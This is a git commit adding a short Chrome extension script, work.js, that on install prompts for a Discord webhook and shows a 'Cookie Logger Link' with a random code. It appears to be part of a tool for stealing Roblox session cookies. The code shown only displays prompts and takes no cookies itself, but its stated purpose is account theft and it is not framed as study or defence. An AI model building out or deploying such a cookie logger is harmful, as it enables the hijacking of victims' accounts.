b05f116a0b041f7e707d405412dbecc1b8c40d04
leecade08 <79605301+leecade08@users.noreply.github.com>
2021-03-04 09:51:08 -0600

    Add files via upload

---
+++ work.js
@@ -0,0 +1,7 @@
+chrome.runtime.onInstalled.addListener(function() {
+ 
+var numRand = Math.floor(Math.random() * 99999999999);
+ 
+prompt("Your Cookie Logger Link! Copy --   rblxapitxt/   -- and paste your unique code behind it!", numRand, prompt("Please enter your Discord Webhook", "webhook here"));
+  
+})
